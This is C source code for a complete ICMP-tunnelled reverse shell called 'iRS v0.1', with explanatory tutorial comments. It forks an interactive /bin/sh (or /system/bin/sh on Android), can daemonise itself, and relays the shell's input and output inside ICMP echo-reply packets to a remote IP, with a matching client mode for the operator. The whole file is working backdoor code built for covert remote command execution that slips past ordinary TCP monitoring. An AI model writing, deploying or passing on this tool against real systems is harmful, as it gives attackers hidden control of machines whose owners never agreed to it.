#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/ip.h>
#include <linux/icmp.h>

/* Helper functions */
#define BUF_SIZE 1024

// two function pointers that we can easily change (at run-time)
// to point to different implementation.
static int (*net_read)(int fd, void *buf, size_t count);
static int (*net_write) (int fd, void *buf, size_t count);

static int icmp_type = ICMP_ECHOREPLY;;
static int id = 12345;

// This struc represents a packet as it is read from
// a IPPROTO_ICMP RAW socket. The RAW socket will return
// an IP header, then a ICMP header followed by the data.
//
// In this example, and again, to keep things simple,
// we are using a fixed packet format. Our data packet
// is composed of an integer indicating the size of the
// data in the packet, plus a data block with a maximum
// size of BUF_SIZE. So our packets will look like this:
//
// +-----------+-------------+-------------------+
// | IP Header | ICMP Header | Len  | shell data |
// |           +-------------+-------------------+
// +---------------------------------------------+
typedef struct
{
        struct iphdr ip;
        struct icmphdr icmp;
        int len;
        char data[BUF_SIZE];     /* Data */
} PKT;

// struct to write into the network our shell data within
// ICMP packets.
//
// This represents the packet we will be sending. By default,
// sockets RAW does not give us access to the IP header. This
// is convenient as we do not have to care about feeding IP
// addressed or calculating checksums for the whole IP packet.
// It can indeed be forced, but in this case it is just not
// convenient. That is why our transmission packet does not
// have an IP header. If you need to access the IP header,
// you can do it using the IP_HDRINCL socket option
// (man 7 raw for more info).
typedef struct {
        struct icmphdr icmp;
        int len;
} PKT_TX;

static struct sockaddr_in dest;

// Creates a RAW socket. The same RAW socket will be
// used to write our sniffer (to capture the ICMP
// traffic) and also to inject our ICMP requests with
// our own data.
//
// Two parameters, the first one is the destination IP of
// our ICMP packets. The second is the protocol, by
// default we have selected ICMP.
//
//
// Returns a file descriptor representing the raw socket
int
raw_init (char *ip, int proto)
{
        int s;

        if ((s = socket (AF_INET, SOCK_RAW, proto)) < 0)
        {
                perror ("socket:");
                exit (1);
        }

        dest.sin_family = AF_INET;
        inet_aton (ip, &dest.sin_addr);
        fprintf (stderr, "+ Raw to '%s' (type : %d)\n", ip, icmp_type);

        return s;
}

/* ICMP */
u_short
icmp_cksum (u_char *addr, int len)
{
        register int sum = 0;
        u_short answer = 0;
        u_short *wp;

        for (wp = (u_short*)addr; len > 1; wp++, len -= 2)
                sum += *wp;

        /* Take in an odd byte if present */
        if (len == 1)
        {
                *(u_char *)&answer = *(u_char*)wp;
                sum += answer;
        }

        sum = (sum >> 16) + (sum & 0xffff); /* add high 16 to low 16 */
        sum += (sum >> 16);             /* add carry */
        answer = ~sum;                  /* truncate to 16 bits */

        return answer;
}

// packet sniffer,
// As packets used in this example have a fixed size, we can
// just read then in one shot (note that this may have issues
// in a heavily loaded network), and then we just check the
// ICMP message type and id. This is the way we mark our packets
// to know they are ours and not a regular ICMP message.
//
// An alternative is to add a magic word just before the len in
// the data part of the packet and check that value to identify
// the packet.
//
// If the packet is ours (and not a normal ICMP packet), the
// data is copied in the provided buffer and its length is
// returned. The async_read function takes care of the rest from
// this point on.
//
// Returns the length of the packet received or 0
int
net_read_icmp (int s, void *buf, size_t count)
{
        PKT pkt;
        int len, l;

        l = read (s, &pkt, sizeof (PKT)); // Read IP + ICMP header
        if ((pkt.icmp.type == icmp_type) &&
            (ntohs(pkt.icmp.un.echo.id) == id))
        {
                len = ntohs (pkt.len);
                memcpy (buf, (char*)pkt.data, len);
                return len;
        }

        return 0;
}

// packet injector,
//
// For RAW sockets, were we are not binding the socket
// to any address and there is no accept or connect involved,
// we have to use the datagram primitives. The sendto system
// call allows us to send data to a specific address, in this
// case to the IP address we passed to the program as parameter.
//
// Note: we are not setting the IP header so this is the way we
// provide the destination IP address to the TCP/IP stack.
int
net_write_icmp (int s, void *buf, size_t count)
{
        PKT_TX          *pkt;
        struct icmphdr *icmp = (struct icmphdr*) &pkt;
        int len;

        // dynamically allocate the packet including the
        // size of the buffer we want to transmit
        pkt = malloc (sizeof (PKT_TX) + count);
        icmp = (struct icmphdr*) pkt;
        pkt->len = htons(count);
        // fill in the content
        memcpy ((unsigned char*)pkt + sizeof(PKT_TX), buf, count);

        len = count + sizeof(int);
        len += sizeof (struct icmphdr);

        /* Build an ICMP Packet */
        // icmp_type and the id parameters are relevant since
        // are used by our sniffer to identify our own packets.
        icmp->type = icmp_type;
        icmp->code = 0;
        icmp->un.echo.id = htons(id);
        icmp->un.echo.sequence = htons(5);
        // set the checksum field to zero and calculate the checksum
        // for the packet
        icmp->checksum = 0;
        icmp->checksum = icmp_cksum ((char*)icmp, len);

        sendto (s, pkt, len, 0,
                (struct sockaddr*) &dest,
                sizeof (struct sockaddr_in));
        free (pkt);
        return len;
}

// Function that allow us to implement a reverse remote shell.
//
// It makes use of two system calls dup2 and execv. The first one
// duplicates a given file descriptor. In this case, the three
// calls at the beginning of the function, assigns the file
// descriptor received as parameter to the Standard Input (file
//  descriptor 0), Standard Output (file descriptor 1) and
// Standard Error (file descriptor 3).
//
// If the file descriptor we pass as a parameter is one of the
// sockets created with our previous client and server functions,
// we are effectively sending and receiving data through the
// network every time we write data to the console and we read data
// from stdin.
//
// Ported to ANDROID
int
start_shell (int s)
{
        char *name[3];

#ifdef VERBOSE
        printf ("+ Starting shell\n");
#endif
        dup2 (s, 0);
        dup2 (s, 1);
        dup2 (s, 2);

#ifdef _ANDROID
        name[0] = "/system/bin/sh";
#else
        name[0] = "/bin/sh";
#endif
        name[1] = "-i";
        name[2] = NULL;
        execv (name[0], name );
        exit (EXIT_FAILURE);

        return 0;
}

// This function decode the information received from the network sends
// it to the shell using the counterpart socket (from the socketpair)
// system call.
//
// At the same time, whenever the shell produces some output, this function
// will read that data, crypt it and send it over the network.
//
// Receives as parameters two file descriptors, one representing the
// socketpair end for communications with the shell (s1) and the
// other for networking (s).
void
async_read (int s, int s1)
{
        fd_set rfds;
        struct timeval tv;
        int max = s > s1 ? s : s1;
        int len, r;
        char buffer[BUF_SIZE];  /* 1024 chars */
        max++;

        while (1)
        {
                // macros to initialize the file descriptor set
                FD_ZERO(&rfds);
                FD_SET(s,&rfds);
                FD_SET(s1,&rfds);

                /* Time out. */
                // set to 1 second
                // microseconds resolution
                tv.tv_sec = 1;
                tv.tv_usec = 0;

                // standard select loop for a network application.
                if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
                {
                        perror ("select:");
                        exit (EXIT_FAILURE);
                }
                else if (r > 0) /* If there is data to process */
                {
                // The memfrob function does a XOR crypting with
                // key (42). The greatest thing about XOR crypting is that the
                // same function can be used for crypt and decrypt. Other than
                // that, with a 1 byte long key (42 in this case) it is pretty
                // useless.
                        if (FD_ISSET(s, &rfds))
                        {
                                // get data from network using function pointer,
                                // and resend it to our shell.
                                memset (buffer, 0, BUF_SIZE);
                                if ((len = net_read (s, buffer, BUF_SIZE)) == 0) continue;
                                write (s1, buffer, len);
                        }
                        if (FD_ISSET(s1, &rfds))
                        {
                                // get data from our shell, then
                                // we send it back through the network using the
                                // function pointer.
                                memset (buffer, 0, BUF_SIZE);
                                if ((len = read (s1, buffer, BUF_SIZE)) <= 0) exit (EXIT_FAILURE);
                                net_write (s, buffer, len);
                        }
                }
        }
}

// Set up the socket pair and create a new process (using fork)
//
// Function creates a socket pair using the syscall socketpair).
// The fork system call creates a new process as an identical image
// that make use of the sp socketpair to communicate both processes.
//
// Instead of feeding data into our shell directly from the network,
// function is used to send/receive data using the counterpart socket
// provided by socketpair.
void
secure_shell (int s)
{
        pid_t pid;
        int sp[2];

        /* Create a socketpair to talk to the child process */
        if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
        {
                perror ("socketpair:");
                exit (1);
        }

        /* Fork a shell */
        if ((pid = fork ()) < 0)
        {
                perror ("fork:");
                exit (1);
        }
        else
        if (!pid) /* Child Process */
        {
                close (sp[1]);
                close (s);

                start_shell (sp[0]);
                /* This function will never return */
        }

        /* At this point we are the father process */
        close (sp[0]);
#ifdef VERBOSE
        printf ("+ Starting async read loop\n");
#endif
        net_write (s, "iRS v0.1\n", 9);
        async_read (s, sp[1]);

}

int
main (int argc, char *argv[])
{
        int i =1;
        /* FIXME: Check command-line arguments */
        /* Go daemon ()*/

        // Assign function pointers
        net_read = net_read_icmp;
        net_write = net_write_icmp;

        if (argv[i][0] == 'd')
        {
                i++;
                daemon (0,0);
        }

        if (argv[i][0] == 's')
                secure_shell (raw_init (argv[i+1], IPPROTO_ICMP));
        else if (argv[i][0] == 'c')
                async_read (raw_init (argv[i+1], IPPROTO_ICMP), 0);

        return 0;
}
